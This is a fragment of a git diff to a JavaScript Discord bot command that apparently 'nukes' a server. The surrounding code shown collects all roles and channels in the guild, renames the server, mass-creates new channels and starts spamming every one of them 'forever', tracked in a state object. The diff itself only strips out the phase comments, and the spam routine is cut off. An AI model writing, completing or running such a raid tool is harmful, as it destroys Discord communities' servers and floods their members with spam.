@@ -28,7 +28,6 @@ export default {
             await message.delete().catch(() => {});
         } catch {}
 
-        // ── PHASE 1: Delete everything in parallel ────────────────────
         const roles = [...guild.roles.cache.values()].filter(r => r.id !== guild.id && r.editable);
         const channels = [...guild.channels.cache.values()];
 
@@ -38,7 +37,6 @@ export default {
             guild.setName(serverName).catch(() => {}),
         ]);
 
-        // ── PHASE 2: Create channels in parallel ──────────────────────
         const created = await Promise.allSettled(
             channelNames.map(name =>
                 guild.channels.create(name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, ''), {
@@ -51,10 +49,8 @@ export default {
             .filter(r => r.status === 'fulfilled' && r.value)
             .map(r => r.value);
 
-        // ── PHASE 3: Spam all channels simultaneously, forever ────────
         if (!newChannels.length) return;
 
-        // Store spam state so +nukes stop works
         client._nukeSpam = { active: true, channels: newChannels };
 
         const spamChannel = async (ch) => {
